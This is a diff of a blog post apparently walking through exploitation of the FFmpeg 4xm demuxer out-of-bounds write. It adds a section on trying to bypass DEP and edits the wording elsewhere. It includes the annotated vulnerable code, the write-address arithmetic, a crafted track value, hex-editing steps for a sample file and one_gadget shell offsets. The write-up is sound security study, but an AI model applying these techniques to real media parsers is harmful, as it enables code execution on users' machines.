@@ -83,7 +83,7 @@ static int fourxm_read_header(AVFormatContext *s,
     if (get_buffer(pb, header, header_size) != header_size)
         return AVERROR(EIO);
 
-     /* take the lazy approach and search for any and all vtrk and strk         chunks */
+     /* take the lazy approach and search for any and all vtrk and strk chunks */
      for (i = 0; i < header_size - 8; i++) {
          fourcc_tag = AV_RL32(&header[i]);
          size = AV_RL32(&header[i + 4]);
@@ -125,7 +125,7 @@ static int fourxm_read_header(AVFormatContext *s,
              current_track = AV_RL32(&header[i + 8]); // !! uint -> int
              if (current_track + 1 > fourxm->track_count) { // b00m
                  fourxm->track_count = current_track + 1;
-                 if((unsigned)fourxm->track_count >= UINT_MAX /                 sizeof(AudioTrack))
+                 if((unsigned)fourxm->track_count >= UINT_MAX / sizeof(AudioTrack))
                      return -1;
                  fourxm->tracks = av_realloc(fourxm->tracks, // we can avoid this s.t fourxm->tracks is null
                      fourxm->track_count * sizeof(AudioTrack));
@@ -134,7 +134,7 @@ static int fourxm_read_header(AVFormatContext *s,
                      return AVERROR(ENOMEM);
                  }
              }
-             fourxm->tracks[current_track].adpcm = AV_RL32(&header[i + 12]);       // here we deref whatever addr we can put into current_track
+             fourxm->tracks[current_track].adpcm = AV_RL32(&header[i + 12]); // here we deref whatever addr we can put into current_track
              fourxm->tracks[current_track].channels = AV_RL32(&header[i + 36]);
              fourxm->tracks[current_track].sample_rate = AV_RL32(&header[i +    40]);
              fourxm->tracks[current_track].bits = AV_RL32(&header[i + 44]);
@@ -145,18 +145,18 @@ static int fourxm_read_header(AVFormatContext *s,
              if (!st)
                  return AVERROR(ENOMEM);
 
-             av_set_pts_info(st, 60, 1, fourxm->tracks[current_track].          sample_rate);
+             av_set_pts_info(st, 60, 1, fourxm->tracks[current_track].sample_rate);
 
              fourxm->tracks[current_track].stream_index = st->index;
 
              st->codec->codec_type = CODEC_TYPE_AUDIO;
              st->codec->codec_tag = 0;
              st->codec->channels = fourxm->tracks[current_track].channels;
-             st->codec->sample_rate = fourxm->tracks[current_track].            sample_rate;
+             st->codec->sample_rate = fourxm->tracks[current_track].sample_rate;
              st->codec->bits_per_coded_sample = fourxm->tracks[current_track].  bits;
-             st->codec->bit_rate = st->codec->channels * st->codec-             >sample_rate *
+             st->codec->bit_rate = st->codec->channels * st->codec->sample_rate *
                  st->codec->bits_per_coded_sample;
-             st->codec->block_align = st->codec->channels * st->codec-          >bits_per_coded_sample;
+             st->codec->block_align = st->codec->channels * st->codec->bits_per_coded_sample;
              if (fourxm->tracks[current_track].adpcm)
                  st->codec->codec_id = CODEC_ID_ADPCM_4XM;
              else if (st->codec->bits_per_coded_sample == 8)
@@ -227,7 +227,7 @@ static av_always_inline av_const uint32_t bswap_32(uint32_t x)
  }
 ```
 
-this one is a bit hard to follow but basically its doing some bytes swapping, you can simulate what it does in the python interpreter like so:
+this one may seem confusing to follow but basically its doing some bytes swapping, you can simulate what it does in the python interpreter like so:
 
 ```python
 >>> x = 0xaabbccdd
@@ -247,7 +247,7 @@ this one is a bit hard to follow but basically its doing some bytes swapping, yo
 '0xddccbbaa'
 ```
 
-Reviewing once again what tobias says in the book:
+Reviewing once again what the author says in the book:
 
 ```
  1. fourxm->tracks is initialized with NULL (see line 107).
@@ -269,7 +269,7 @@ Reviewing once again what tobias says in the book:
 
 You might be thinking to yourself - this arbitrary write is simple! fourxm->tracks is null, plus our controlled current_track gives us an arbitrary write! Afterwards you may be surprised to find the following assembly for that assignment:
 
-In the book tobias says the algorithm is as such:
+In the author says the algorithm is as such:
 
 ```
  edx + ((ebx + ebx * 4) << 2) + 0x10 = destination address of write operation
@@ -293,7 +293,7 @@ As we begin edx is our current track. `movsxd` extends our 32 bit value to a 64 
 
 At 0x0046172b we see `rcx = rcx + rcx * 4`, then at 0x00461732 `r13 = rcx * 4` once again.
 
-Thus we have `r13 = (rcx + rcx * 4) * 4` or the equivalent: `r13 = (rcx + rcx * 4) << 2` as tobias wrote.
+Thus we have `r13 = (rcx + rcx * 4) * 4` or the equivalent: `r13 = (rcx + rcx * 4) << 2` as the author wrote (i missed a detail here! there is a trailing + 0x10 at the end! i will talk more about this later.).
 
 ## verifying exploitability
 
@@ -341,7 +341,7 @@ When run it gives us the following:
 Value for 'current_track': 8d3725a9
 ```
 
-Now all I needed was a valid 4xm file to modify with this value for the `current_track` which i found following [a link](http://samples.mplayerhq.hu/game-formats/4xm/dracula.4xm) from the book. I cracked it open with `r2 -w dracula.4xm` then we can modify it in a hex editor like view with the `V` command. We are greeted with the hex encoded file:
+Now all I needed was a valid 4xm file to modify with this value for the `current_track` which i found following [a link](http://samples.mplayerhq.hu/game-formats/4xm/dracula.4xm) from the book. I cracked it open with `r2 -w dracula.4xm`, then i could modify it in a hex editor like view with the `V` command. We are greeted with the hex encoded file:
 
 ```
 [0x00000000 0% 2408 dracula.4xm]> xc
@@ -825,4 +825,65 @@ io.interactive()
 
 ## Bypassing DEP
 
+Probably for the worse, I didnt't spend any time researching other bugs I could chain together with this one, I decided to attempt to simply return to the [one shot gadget](https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html), however i searched all of the calls to potential functions whose GOT table entries I could overwrite (ones who would be called between the time of our write bug being triggered and the time of our program exit) and none were viable.
 
+There are certain pre-requirements for using the one shot gadgets as shown below:
+
+```
+one_gadget libc.so.6 -l 1                                                                                                             ryuk@shinigami-mansion
+0x3ac5c execve("/bin/sh", esp+0x28, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x28] == NULL
+
+0x3ac5e execve("/bin/sh", esp+0x2c, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x2c] == NULL
+
+0x3ac62 execve("/bin/sh", esp+0x30, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x30] == NULL
+
+0x3ac69 execve("/bin/sh", esp+0x34, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x34] == NULL
+
+0x3ac8c execve("/bin/sh", eax, [esp])
+constraints:
+  esi is the GOT address of libc
+  [eax] == NULL || eax == NULL
+  [[esp]] == NULL || [esp] == NULL
+
+0x3ac8d execve("/bin/sh", [esp], [esp+0x4])
+constraints:
+  esi is the GOT address of libc
+  [[esp]] == NULL || [esp] == NULL
+  [[esp+0x4]] == NULL || [esp+0x4] == NULL
+
+0x5fbc5 execl("/bin/sh", eax)
+constraints:
+  esi is the GOT address of libc
+  eax == NULL
+
+0x5fbc6 execl("/bin/sh", [esp])
+constraints:
+  esi is the GOT address of libc
+  [esp] == NULL
+```
+
+Perhaps I did not look well enough - one idea I just had is perhaps I can cross-reference the output of ltrace to ensure that I covered all of my bases when looking for potential GOT entries to overwrite whos calls might fit the pre-requrements desired by one of the one-shot gadgets. Here is a list of the functions I looked at overwriting the GOT entries for:
+
+
+```
+memalign
+memset
+free
+memcpy
+```
+
+Let me know if you happen to have any ideas! In particular I'd be curious if you know of some other bug I could chain together with this one in order to more eloquently bypass DEP, or if you have any ideas for a way to chain together more than 1 gadget using only this bug! Let's work together to write a cool exploit :)
+
+Next blog entry will outline my first exploration finding a security related bug of my own in an open source project!
